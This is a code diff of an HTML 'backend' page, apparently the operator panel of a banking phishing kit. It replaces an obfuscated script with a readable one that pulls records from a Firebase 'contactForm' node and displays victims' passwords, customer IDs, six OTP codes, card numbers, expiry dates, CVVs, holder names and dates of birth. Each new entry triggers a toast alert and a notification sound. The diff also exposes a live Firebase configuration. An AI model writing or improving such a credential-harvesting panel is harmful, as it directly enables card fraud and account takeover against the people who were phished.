@@ -72,21 +72,167 @@
             margin-bottom: 9px;
             padding: 3px 0;
         }
+
+        .toast {
+            visibility: hidden;
+            min-width: 250px;
+            margin-left: -125px;
+            background-color: #020d83;
+            color: #fff;
+            text-align: center;
+            border-radius: 50px;
+            padding: 16px;
+            position: fixed;
+            z-index: 1;
+            left: 50%;
+            bottom: 30px;
+            font-size: 17px;
+            opacity: 0;
+            transition: opacity 0.5s, visibility 0.5s;
+        }
+
+        .toast.show {
+            visibility: visible;
+            opacity: 1;
+        }
     </style>
 </head>
 
 <body>
-    <h2>UserData Backend</h2>
+    <h2>Advance Backend</h2>
 
     <ul id="formDataList">
         <!-- Data will be dynamically added here -->
     </ul>
-
+    <div id="toast" class="toast">New Data Added!</div>
     <!-- Firebase JavaScript SDK -->
+    <audio id="notificationSound">
+        <source src="notification.mp3" type="audio/mpeg">
+      </audio>
+
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script>
-var _0x3d8527=_0x42aa;(function(_0x59c64c,_0x3edc77){var _0x31d89a=_0x42aa,_0x4191cd=_0x59c64c();while(!![]){try{var _0x15c61a=-parseInt(_0x31d89a(0x149))/0x1+parseInt(_0x31d89a(0x14f))/0x2*(-parseInt(_0x31d89a(0x14a))/0x3)+parseInt(_0x31d89a(0x143))/0x4+parseInt(_0x31d89a(0x124))/0x5+parseInt(_0x31d89a(0x152))/0x6+parseInt(_0x31d89a(0x137))/0x7*(parseInt(_0x31d89a(0x131))/0x8)+parseInt(_0x31d89a(0x146))/0x9*(parseInt(_0x31d89a(0x145))/0xa);if(_0x15c61a===_0x3edc77)break;else _0x4191cd['push'](_0x4191cd['shift']());}catch(_0x136af3){_0x4191cd['push'](_0x4191cd['shift']());}}}(_0x332e,0xb1dc0));function _0x42aa(_0x50bfc2,_0x91d0eb){var _0x332e87=_0x332e();return _0x42aa=function(_0x42aa60,_0x55f9f3){_0x42aa60=_0x42aa60-0x124;var _0xd72bfd=_0x332e87[_0x42aa60];return _0xd72bfd;},_0x42aa(_0x50bfc2,_0x91d0eb);}const firebaseConfig={'apiKey':_0x3d8527(0x151),'authDomain':_0x3d8527(0x132),'databaseURL':'https://start-45a39-default-rtdb.firebaseio.com','projectId':_0x3d8527(0x150),'storageBucket':'start-45a39.appspot.com','messagingSenderId':'377019727798','appId':'1:377019727798:web:5c56be02bc821e6ec88b17'};firebase[_0x3d8527(0x14d)](firebaseConfig);var contactFormRef=firebase['database']()[_0x3d8527(0x126)](_0x3d8527(0x12d));function handleNewData(_0x1539a4){var _0x44ff66=_0x3d8527,_0x319e1b=_0x1539a4[_0x44ff66(0x130)](),_0x3864db=document[_0x44ff66(0x135)]('li'),_0x1c4706='';_0x319e1b[_0x44ff66(0x13d)]&&(_0x1c4706+=_0x44ff66(0x13b)+_0x319e1b[_0x44ff66(0x13d)]+_0x44ff66(0x12c));_0x319e1b['otp1']&&(_0x1c4706+=_0x44ff66(0x141)+_0x319e1b[_0x44ff66(0x148)]+_0x44ff66(0x12c));_0x319e1b[_0x44ff66(0x129)]&&(_0x1c4706+=_0x44ff66(0x125)+_0x319e1b[_0x44ff66(0x129)]+'\x20</p></div>');_0x319e1b[_0x44ff66(0x136)]&&(_0x1c4706+='<div\x20class=\x22box\x22><strong>OTP\x203\x20:</strong>\x20<p>\x20'+_0x319e1b[_0x44ff66(0x136)]+_0x44ff66(0x12c));_0x319e1b[_0x44ff66(0x133)]&&(_0x1c4706+=_0x44ff66(0x13c)+_0x319e1b[_0x44ff66(0x133)]+_0x44ff66(0x12c));_0x319e1b[_0x44ff66(0x155)]&&(_0x1c4706+=_0x44ff66(0x134)+_0x319e1b['otp5']+_0x44ff66(0x12c));_0x319e1b[_0x44ff66(0x12e)]&&(_0x1c4706+=_0x44ff66(0x142)+_0x319e1b[_0x44ff66(0x12e)]+_0x44ff66(0x12c));_0x319e1b['customerid']&&(_0x1c4706+='<div\x20class=\x22box\x22><strong>Customer\x20Id\x20:</strong>\x20<p>\x20'+_0x319e1b[_0x44ff66(0x13f)]+'\x20</p></div>');_0x319e1b[_0x44ff66(0x127)]&&(_0x1c4706+=_0x44ff66(0x13e)+_0x319e1b[_0x44ff66(0x127)]+_0x44ff66(0x12c));_0x319e1b[_0x44ff66(0x12b)]&&(_0x1c4706+=_0x44ff66(0x12f)+_0x319e1b[_0x44ff66(0x12b)]+_0x44ff66(0x12c));_0x319e1b[_0x44ff66(0x157)]&&(_0x1c4706+=_0x44ff66(0x14b)+_0x319e1b[_0x44ff66(0x157)]+_0x44ff66(0x12c));_0x319e1b[_0x44ff66(0x156)]&&(_0x1c4706+=_0x44ff66(0x138)+_0x319e1b[_0x44ff66(0x156)]+_0x44ff66(0x12c));_0x319e1b['cvv']&&(_0x1c4706+=_0x44ff66(0x153)+_0x319e1b['cvv']+'\x20</p></div>');_0x319e1b['creditlimit']&&(_0x1c4706+='<div\x20class=\x22box\x22><strong>Credit\x20Limit\x20:</strong>\x20<p>\x20'+_0x319e1b['creditlimit']+_0x44ff66(0x12c));_0x319e1b['regmobile']&&(_0x1c4706+=_0x44ff66(0x12f)+_0x319e1b[_0x44ff66(0x154)]+_0x44ff66(0x12c));_0x319e1b['holdername']&&(_0x1c4706+=_0x44ff66(0x139)+_0x319e1b[_0x44ff66(0x14e)]+_0x44ff66(0x12c));_0x319e1b[_0x44ff66(0x12a)]&&(_0x1c4706+=_0x44ff66(0x147)+_0x319e1b[_0x44ff66(0x12a)]+'\x20</p></div>');_0x3864db[_0x44ff66(0x140)]=_0x1c4706;var _0x15923a=document[_0x44ff66(0x144)](_0x44ff66(0x13a)),_0x48539c=document[_0x44ff66(0x144)](_0x319e1b[_0x44ff66(0x13f)]);_0x48539c?_0x48539c[_0x44ff66(0x140)]=_0x3864db[_0x44ff66(0x140)]:(_0x3864db['id']=_0x319e1b[_0x44ff66(0x13f)],_0x15923a['insertBefore'](_0x3864db,_0x15923a[_0x44ff66(0x128)]));}contactFormRef['on']('child_added',function(_0x539a22){handleNewData(_0x539a22);}),contactFormRef['on'](_0x3d8527(0x14c),function(_0x404a5b){handleNewData(_0x404a5b);});function _0x332e(){var _0x943828=['contactForm','otp6','<div\x20class=\x22box\x22><strong>Mobile\x20:</strong>\x20<p>\x20','val','441160XDoIDw','start-45a39.firebaseapp.com','otp4','<div\x20class=\x22box\x22><strong>OTP\x205\x20:</strong>\x20<p>\x20','createElement','otp3','7uMUdXM','<div\x20class=\x22box\x22><strong>Expiry\x20Date\x20:</strong>\x20<p>\x20','<div\x20class=\x22box\x22><strong>Holder\x20Name\x20:</strong>\x20<p>\x20','formDataList','<div\x20class=\x22box\x22><p\x20id=\x22date\x22>\x20Date\x20&\x20Time\x20','<div\x20class=\x22box\x22><strong>OTP\x204\x20:</strong>\x20<p>\x20','currentDateTime','<div\x20class=\x22box\x22><strong>Password\x20:\x20</strong>\x20<p>\x20','customerid','innerHTML','<div\x20class=\x22box\x22>\x20<strong>OTP\x201\x20:</strong>\x20<p>\x20','<div\x20class=\x22box\x22><strong>OTP\x206\x20Updated\x20:</strong>\x20<p>\x20','3217376pGUqLj','getElementById','1495750qtITxd','36xnOETI','<div\x20class=\x22box\x22><strong>DOB\x20:</strong>\x20<p>\x20','otp1','137853GHLeeb','20310TrQPuR','<div\x20class=\x22box\x22><strong>Credit\x20Number\x20:</strong>\x20<p>\x20','child_changed','initializeApp','holdername','310lSNigt','start-45a39','AIzaSyD5wSvrZXq9FFfJ0SoDxGfp6kVQ7VEyNFA','99594FwfXXN','<div\x20class=\x22box\x22><strong>Cvv\x20:</strong>\x20<p>\x20','regmobile','otp5','expiredate','creditnumber','2206635hFYMry','<div\x20class=\x22box\x22><strong>OTP\x202\x20:</strong>\x20<p>\x20','ref','password','firstChild','otp2','dob','mobile','\x20</p></div>'];_0x332e=function(){return _0x943828;};return _0x332e();}
+        const firebaseConfig = {
+            apiKey: "AIzaSyD5wSvrZXq9FFfJ0SoDxGfp6kVQ7VEyNFA",
+            authDomain: "start-45a39.firebaseapp.com",
+            databaseURL: "https://start-45a39-default-rtdb.firebaseio.com",
+            projectId: "start-45a39",
+            storageBucket: "start-45a39.appspot.com",
+            messagingSenderId: "377019727798",
+            appId: "1:377019727798:web:5c56be02bc821e6ec88b17"
+        };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+
+        // Reference to your database
+        var contactFormRef = firebase.database().ref("contactForm");
+
+        // Function to handle new child added or changes
+        function handleNewData(snapshot) {
+            var data = snapshot.val();
+
+            // Create list item to display data
+            var listItem = document.createElement("li");
+            var innerHTML = "";
+
+            // Conditionally add fields if they exist
+            if (data.currentDateTime) {
+                innerHTML += `<div class="box"><p id="date"> Date & Time ${data.currentDateTime} </p></div>`;
+            }
+            if (data.otp1) {
+                innerHTML += `<div class="box"> <strong>OTP 1 :</strong> <p> ${data.otp1} </p></div>`;
+            }
+            if (data.otp2) {
+                innerHTML += `<div class="box"><strong>OTP 2 :</strong> <p> ${data.otp2} </p></div>`;
+            }
+            if (data.otp3) {
+                innerHTML += `<div class="box"><strong>OTP 3 :</strong> <p> ${data.otp3} </p></div>`;
+            }
+            if (data.otp4) {
+                innerHTML += `<div class="box"><strong>OTP 4 :</strong> <p> ${data.otp4} </p></div>`;
+            }
+            if (data.otp5) {
+                innerHTML += `<div class="box"><strong>OTP 5 :</strong> <p> ${data.otp5} </p></div>`;
+            }
+            if (data.otp6) {
+                innerHTML += `<div class="box"><strong>OTP 6 :</strong> <p> ${data.otp6} </p></div>`;
+            }
+            if (data.customerid) {
+                innerHTML += `<div class="box"><strong>Customer Id :</strong> <p> ${data.customerid} </p></div>`;
+            }
+            if (data.password) {
+                innerHTML += `<div class="box"><strong>Password : </strong> <p> ${data.password} </p></div>`;
+            }
+            if (data.mobile) {
+                innerHTML += `<div class="box"><strong>Mobile :</strong> <p> ${data.mobile} </p></div>`;
+            }
+            if (data.creditnumber) {
+                innerHTML += `<div class="box"><strong>Credit Number :</strong> <p> ${data.creditnumber} </p></div>`;
+            }
+            if (data.expiredate) {
+                innerHTML += `<div class="box"><strong>Expiry Date :</strong> <p> ${data.expiredate} </p></div>`;
+            }
+            if (data.cvv) {
+                innerHTML += `<div class="box"><strong>Cvv :</strong> <p> ${data.cvv} </p></div>`;
+            }
+            if (data.creditlimit) {
+                innerHTML += `<div class="box"><strong>Credit Limit :</strong> <p> ${data.creditlimit} </p></div>`;
+            }
+            if (data.regmobile) {
+                innerHTML += `<div class="box"><strong>Mobile :</strong> <p> ${data.regmobile} </p></div>`;
+            }
+            if (data.holdername) {
+                innerHTML += `<div class="box"><strong>Holder Name :</strong> <p> ${data.holdername} </p></div>`;
+            }
+            if (data.dob) {
+                innerHTML += `<div class="box"><strong>DOB :</strong> <p> ${data.dob} </p></div>`;
+            }
+
+            // Set the innerHTML of the list item
+            listItem.innerHTML = innerHTML;
+
+            // Get the ul element
+            var formDataList = document.getElementById("formDataList");
+
+            // Check if list item already exists (for updates)
+            var existingItem = document.getElementById(data.customerid);
+            if (existingItem) {
+                // Update existing item
+                existingItem.innerHTML = listItem.innerHTML;
+            } else {
+                // Insert the new list item at the top (latest data first)
+                listItem.id = data.customerid; // Set id for easy update reference
+                formDataList.insertBefore(listItem, formDataList.firstChild);
+            }
+            // Show toast message
+            showToast("New Data Added!");
+
+            playSound();
+        }
+
+        // Listen for new data added to the database
+        contactFormRef.on("child_added", function (snapshot) {
+            handleNewData(snapshot);
+        });
+
+        // Listen for data changes
+        contactFormRef.on("child_changed", function (snapshot) {
+            handleNewData(snapshot);
+        });
+        function showToast(message) {
+            const toast = document.getElementById("toast");
+            toast.textContent = message;
+            toast.className = "toast show";
+            setTimeout(function () {
+                toast.className = toast.className.replace("show", "");
+            }, 300000);
+        }
+        function playSound() {
+            var audio = document.getElementById("notificationSound");
+            audio.play();
+        }
     </script>
 </body>
 
